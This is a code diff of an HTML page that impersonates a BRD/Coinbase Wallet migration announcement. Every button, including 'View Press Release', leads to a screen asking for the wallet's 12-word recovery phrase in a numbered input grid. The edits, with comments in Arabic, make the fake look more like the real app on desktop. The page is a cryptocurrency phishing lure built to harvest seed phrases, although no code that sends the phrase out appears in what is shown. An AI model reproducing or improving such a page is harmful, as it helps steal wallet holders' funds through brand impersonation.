@@ -9,11 +9,10 @@
         :root {
             --bg-color: #1e1e3f;
             --btn-blue: #586cf5;
-            --btn-hover-blue: #4759d1;
-            --btn-gray: #4b4c68;
+            --btn-gray: #3e3f5e;
             --text-white: #ffffff;
             --text-secondary: #b0b0cc;
-            --border-color: rgba(255, 255, 255, 0.1);
+            --grid-border: rgba(255, 255, 255, 0.1);
         }
 
         * {
@@ -30,224 +29,219 @@
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            overflow-x: hidden;
+            margin: 0;
         }
 
-        /* حاوية الهاتف الافتراضية */
-        .phone-mockup {
+        /* حاوية ديناميكية توازن بين الحاسوب والهاتف */
+        .container {
             width: 100%;
-            max-width: 420px;
-            height: 100vh;
-            max-height: 900px;
-            position: relative;
-            background-color: var(--bg-color);
+            max-width: 500px; /* حجم مثالي للحاسوب لتبدو كالتطبيق */
+            min-height: 100vh;
             display: flex;
             flex-direction: column;
-            overflow: hidden;
+            padding: 40px 25px;
+            position: relative;
         }
 
-        /* التحكم في عرض الصفحات */
+        @media (min-width: 1024px) {
+            .container {
+                max-width: 450px;
+                min-height: 850px;
+                border: 1px solid var(--grid-border);
+                border-radius: 30px;
+                margin: 20px;
+            }
+        }
+
         .page {
             display: none;
             flex-direction: column;
-            padding: 40px 24px;
-            width: 100%;
             height: 100%;
-            animation: fadeIn 0.3s ease-in-out;
+            animation: fadeIn 0.4s ease;
         }
 
         .page.active { display: flex; }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateX(20px); }
-            to { opacity: 1; transform: translateX(0); }
-        }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-        /* --- تصميم الصفحة الأولى --- */
-        .logo-section {
-            margin-top: 40px;
+        /* الشاشة الأولى */
+        .logo-area {
             display: flex;
             flex-direction: column;
             align-items: center;
+            margin-top: 20px;
             margin-bottom: 40px;
         }
 
-        .cb-icon {
-            width: 75px;
-            height: 75px;
-            background: #0052ff;
+        /* أيقونة Coinbase الأصلية */
+        .cb-logo {
+            width: 85px;
+            height: 85px;
+            background-color: #0052ff;
             border-radius: 50%;
             display: flex;
             justify-content: center;
             align-items: center;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
         }
 
-        .cb-icon-inner {
-            width: 28px;
-            height: 28px;
-            border: 5px solid white;
-            border-radius: 4px;
+        .cb-logo-inner {
+            width: 32px;
+            height: 32px;
+            border: 6px solid white;
+            border-radius: 5px;
         }
 
-        .arrow-indicator {
-            font-size: 20px;
+        .arrow-sep {
+            font-size: 22px;
             color: var(--text-secondary);
-            margin-bottom: 8px;
+            margin: 5px 0;
         }
 
-        .brd-logo-main {
-            width: 130px;
+        .brd-main-img {
+            width: 140px;
             height: auto;
         }
 
         h1 {
-            font-size: 26px;
+            font-size: 28px;
             font-weight: 700;
             text-align: center;
-            margin-bottom: 16px;
+            margin-bottom: 20px;
             line-height: 1.2;
         }
 
-        .desc-text {
+        .sub-text {
             color: var(--text-secondary);
-            font-size: 15px;
             text-align: center;
-            line-height: 1.5;
+            font-size: 15px;
+            line-height: 1.6;
             margin-bottom: 60px;
         }
 
-        .btn-stack {
+        .btn-container {
             display: flex;
             flex-direction: column;
-            gap: 14px;
+            gap: 15px;
             margin-top: auto;
-            margin-bottom: 20px;
         }
 
-        .main-btn {
+        .btn {
             width: 100%;
             padding: 18px;
-            border-radius: 6px;
+            border-radius: 8px;
             border: none;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            text-align: center;
-            transition: background 0.2s;
+            transition: 0.2s;
         }
 
-        .bg-blue { background-color: var(--btn-blue); color: white; }
-        .bg-blue:hover { background-color: var(--btn-hover-blue); }
-        .bg-gray { background-color: var(--btn-gray); color: white; }
+        .btn-primary { background-color: var(--btn-blue); color: white; }
+        .btn-secondary { background-color: var(--btn-gray); color: white; }
 
-        /* --- تصميم الصفحة الثانية (Recovery) --- */
-        .nav-header {
+        /* الشاشة الثانية (شبكة الأرقام المطابقة للحقيقة) */
+        .header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 40px;
+            margin-bottom: 50px;
         }
 
-        .back-btn { font-size: 28px; cursor: pointer; padding: 5px; }
-        .help-btn { 
-            width: 24px; height: 24px; 
+        .back-icon { font-size: 30px; cursor: pointer; }
+        .info-icon { 
+            width: 25px; height: 25px; 
             border: 2px solid white; 
             border-radius: 50%; 
             display: flex; justify-content: center; align-items: center;
-            font-size: 14px; font-weight: bold;
+            font-size: 14px;
         }
 
-        .grid-container {
+        .recovery-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            border: 1px solid var(--border-color);
-            border-radius: 10px;
+            width: 100%;
+            border: 1px solid var(--grid-border);
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.03);
             overflow: hidden;
-            background: rgba(255, 255, 255, 0.02);
         }
 
-        .grid-cell {
-            position: relative;
-            border: 0.5px solid var(--border-color);
-            height: 65px;
+        .grid-item {
+            border: 0.5px solid var(--grid-border);
+            height: 80px;
+            padding: 10px;
             display: flex;
             flex-direction: column;
-            padding: 8px;
         }
 
-        .cell-num {
+        .item-num {
             font-size: 12px;
             color: var(--text-secondary);
-            margin-bottom: 4px;
+            margin-bottom: 5px;
         }
 
-        .cell-input {
+        .item-input {
             background: transparent;
             border: none;
             color: white;
-            font-size: 14px;
+            font-size: 15px;
             width: 100%;
             outline: none;
         }
-
     </style>
 </head>
 <body>
 
-<div class="phone-mockup">
-    
-    <div id="page1" class="page active">
-        <div class="logo-section">
-            <div class="cb-icon"><div class="cb-icon-inner"></div></div>
-            <div class="arrow-indicator">↑</div>
-            <img src="https://i.ibb.co/ymp5HL9C/F3-BB5708-18-B2-4-C3-F-89-D2-ADF914-D14-A9-E.png" alt="BRD Logo" class="brd-logo-main">
-        </div>
-
-        <h1>BRD has joined<br>Coinbase Wallet!</h1>
-        <p class="desc-text">We're excited to announce that BRD is joining the Coinbase Wallet team.</p>
-
-        <div class="btn-stack">
-            <button class="main-btn bg-blue" onclick="navigateTo('page2')">Get Coinbase Wallet</button>
-            <button class="main-btn bg-gray" onclick="navigateTo('page2')">View Press Release</button>
-            <button class="main-btn bg-gray" onclick="navigateTo('page2')">Restore Wallet</button>
-        </div>
-    </div>
-
-    <div id="page2" class="page">
-        <div class="nav-header">
-            <div class="back-btn" onclick="navigateTo('page1')">←</div>
-            <div class="help-btn">?</div>
-        </div>
-
-        <h1 style="text-align: left; font-size: 24px;">Récupérer votre portefeuille</h1>
-        <p class="desc-text" style="text-align: left; margin-bottom: 30px;">Veuillez saisir la phrase de récupération du portefeuille que vous souhaitez récupérer.</p>
-
-        <div class="grid-container" id="recoveryGrid">
+    <div class="container">
+        
+        <div id="p1" class="page active">
+            <div class="logo-area">
+                <div class="cb-logo"><div class="cb-logo-inner"></div></div>
+                <div class="arrow-sep">↑</div>
+                <img src="https://i.ibb.co/ymp5HL9C/F3-BB5708-18-B2-4-C3-F-89-D2-ADF914-D14-A9-E.png" class="brd-main-img" alt="BRD">
             </div>
+
+            <h1>BRD has joined<br>Coinbase Wallet!</h1>
+            <p class="sub-text">We're excited to announce that BRD is joining the Coinbase Wallet team.</p>
+
+            <div class="btn-container">
+                <button class="btn btn-primary" onclick="showPage('p2')">Get Coinbase Wallet</button>
+                <button class="btn btn-secondary" onclick="showPage('p2')">View Press Release</button>
+                <button class="btn btn-secondary" onclick="showPage('p2')">Restore Wallet</button>
+            </div>
+        </div>
+
+        <div id="p2" class="page">
+            <div class="header">
+                <div class="back-icon" onclick="showPage('p1')">←</div>
+                <div class="info-icon">?</div>
+            </div>
+
+            <h1 style="text-align: left; font-size: 24px;">Récupérer votre portefeuille</h1>
+            <p class="sub-text" style="text-align: left; margin-bottom: 30px;">Veuillez saisir la phrase de récupération du portefeuille que vous souhaitez récupérer.</p>
+
+            <div class="recovery-grid" id="mainGrid">
+                </div>
+        </div>
+
     </div>
 
-</div>
+    <script>
+        // دالة التنقل
+        function showPage(id) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+        }
 
-<script>
-    // وظيفة التنقل بين الصفحات
-    function navigateTo(pageId) {
-        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        document.getElementById(pageId).classList.add('active');
-    }
-
-    // توليد شبكة الكلمات الـ 12 تلقائياً
-    const grid = document.getElementById('recoveryGrid');
-    for (let i = 1; i <= 12; i++) {
-        const cell = document.createElement('div');
-        cell.className = 'grid-cell';
-        cell.innerHTML = `
-            <span class="cell-num">${i}</span>
-            <input type="text" class="cell-input" autocomplete="off" spellcheck="false">
-        `;
-        grid.appendChild(cell);
-    }
-</script>
-
+        // بناء شبكة الأرقام بدقة
+        const grid = document.getElementById('mainGrid');
+        for (let i = 1; i <= 12; i++) {
+            const div = document.createElement('div');
+            div.className = 'grid-item';
+            div.innerHTML = `<span class="item-num">${i}</span><input type="text" class="item-input" spellcheck="false">`;
+            grid.appendChild(div);
+        }
+    </script>
 </body>
 </html>
